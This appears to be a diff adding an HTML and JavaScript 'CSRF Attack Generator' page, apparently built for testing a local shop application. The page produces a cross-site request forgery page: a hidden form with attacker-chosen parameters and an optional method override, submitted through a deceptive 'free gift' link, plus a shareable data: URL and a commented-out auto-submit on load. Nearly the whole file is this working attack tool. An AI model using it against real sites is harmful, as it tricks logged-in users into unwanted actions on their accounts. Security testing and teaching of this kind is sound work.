@@ -1,0 +1,314 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Attack Generator</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      overflow: hidden;
+    }
+    .header {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    .header h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+    .content {
+      padding: 30px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #e0e0e0;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: border-color 0.3s;
+    }
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      border-color: #667eea;
+    }
+    .params-container {
+      background: #f8f9fa;
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+    }
+    .param-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .param-row input {
+      flex: 1;
+    }
+    button {
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+    }
+    .btn-secondary {
+      background: #6c757d;
+      color: white;
+    }
+    .btn-add {
+      background: #28a745;
+      color: white;
+      width: 100%;
+      margin-top: 10px;
+    }
+    .output-section {
+      margin-top: 30px;
+      padding-top: 30px;
+      border-top: 2px solid #e0e0e0;
+    }
+    .output-box {
+      background: #f8f9fa;
+      border: 2px solid #e0e0e0;
+      border-radius: 6px;
+      padding: 15px;
+      margin-top: 15px;
+      position: relative;
+    }
+    .output-box pre {
+      margin: 0;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: #667eea;
+      color: white;
+      padding: 6px 12px;
+      font-size: 12px;
+    }
+    .url-box {
+      background: #fff3cd;
+      border: 2px solid #ffc107;
+      padding: 15px;
+      border-radius: 6px;
+      margin-top: 15px;
+      word-break: break-all;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🔓 CSRF Attack Generator</h1>
+      <p>Generate malicious forms for CSRF testing</p>
+    </div>
+    
+    <div class="content">
+      <div class="form-group">
+        <label for="action">Target URL (Action):</label>
+        <input type="text" id="action" placeholder="http://localhost:3000/cart/remove/68efc0d8f4adae573c528cd8">
+      </div>
+
+      <div class="form-group">
+        <label for="method">HTTP Method:</label>
+        <select id="method">
+          <option value="POST">POST</option>
+          <option value="GET">GET</option>
+          <option value="PUT">PUT</option>
+          <option value="DELETE">DELETE</option>
+          <option value="PATCH">PATCH</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>
+          <input type="checkbox" id="useOverride"> Use method override (_method parameter)
+        </label>
+      </div>
+
+      <div class="form-group">
+        <label for="linkText">Deceptive Link Text:</label>
+        <input type="text" id="linkText" value="Click here for a free gift! 🎁">
+      </div>
+
+      <div class="form-group">
+        <label>Hidden Parameters:</label>
+        <div class="params-container" id="paramsContainer">
+          <div class="param-row">
+            <input type="text" placeholder="Parameter name" class="param-name">
+            <input type="text" placeholder="Parameter value" class="param-value">
+            <button type="button" class="btn-secondary" onclick="removeParam(this)">Remove</button>
+          </div>
+        </div>
+        <button type="button" class="btn-add" onclick="addParam()">+ Add Parameter</button>
+      </div>
+
+      <button class="btn-primary" onclick="generate()" style="width: 100%; margin-top: 20px;">
+        Generate CSRF Attack
+      </button>
+
+      <div class="output-section" id="outputSection" style="display:none;">
+        <h3>Generated HTML:</h3>
+        <div class="output-box">
+          <button class="copy-btn" onclick="copyCode()">Copy</button>
+          <pre id="codeOutput"></pre>
+        </div>
+
+        <h3 style="margin-top: 20px;">Shareable Attack URL:</h3>
+        <div class="url-box">
+          <strong>data:text/html,</strong><span id="urlOutput"></span>
+        </div>
+        <button class="btn-primary" onclick="copyURL()" style="margin-top: 10px;">Copy URL</button>
+        <button class="btn-secondary" onclick="openURL()" style="margin-top: 10px; margin-left: 10px;">Open in New Tab</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function addParam() {
+      const container = document.getElementById('paramsContainer');
+      const row = document.createElement('div');
+      row.className = 'param-row';
+      row.innerHTML = `
+        <input type="text" placeholder="Parameter name" class="param-name">
+        <input type="text" placeholder="Parameter value" class="param-value">
+        <button type="button" class="btn-secondary" onclick="removeParam(this)">Remove</button>
+      `;
+      container.appendChild(row);
+    }
+
+    function removeParam(btn) {
+      btn.parentElement.remove();
+    }
+
+    function generate() {
+      const action = document.getElementById('action').value;
+      const method = document.getElementById('method').value;
+      const useOverride = document.getElementById('useOverride').checked;
+      const linkText = document.getElementById('linkText').value;
+
+      if (!action) {
+        alert('Please enter a target URL');
+        return;
+      }
+
+      const params = [];
+      document.querySelectorAll('.param-row').forEach(row => {
+        const name = row.querySelector('.param-name').value;
+        const value = row.querySelector('.param-value').value;
+        if (name) {
+          params.push({ name, value });
+        }
+      });
+
+      let formMethod = method;
+      let hiddenInputs = '';
+
+      if (useOverride && (method === 'PUT' || method === 'DELETE' || method === 'PATCH')) {
+        formMethod = 'POST';
+        hiddenInputs += `    <input type="hidden" name="_method" value="${method}" />\n`;
+      }
+
+      params.forEach(param => {
+        hiddenInputs += `    <input type="hidden" name="${param.name}" value="${param.value}" />\n`;
+      });
+
+      const html = `<!doctype html>
+    <html>
+    <head>
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    </head>
+    <body>
+    <h2>CSRF Attack Page</h2>
+    <p>${linkText}</p>
+    <a href="#" id="attackLink">${linkText}</a>
+
+    <form id="csrfForm" action="${action}" method="${formMethod}" style="display:none">
+    ${hiddenInputs}  </form>
+
+    <script>
+        document.getElementById('attackLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('csrfForm').submit();
+        });
+
+        // Auto-submit option (uncomment to enable)
+        // window.onload = function() {
+        //   document.getElementById('csrfForm').submit();
+        // };
+    <\/script>
+    </body>
+    </html>`;
+
+      document.getElementById('codeOutput').textContent = html;
+      document.getElementById('urlOutput').textContent = encodeURIComponent(html);
+      document.getElementById('outputSection').style.display = 'block';
+      document.getElementById('outputSection').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function copyCode() {
+      const code = document.getElementById('codeOutput').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        alert('Code copied to clipboard!');
+      });
+    }
+
+    function copyURL() {
+      const url = 'data:text/html,' + document.getElementById('urlOutput').textContent;
+      navigator.clipboard.writeText(url).then(() => {
+        alert('URL copied to clipboard!');
+      });
+    }
+
+    function openURL() {
+      const url = 'data:text/html,' + document.getElementById('urlOutput').textContent;
+      window.open(url, '_blank');
+    }
+  </script>
+</body>
+</html>
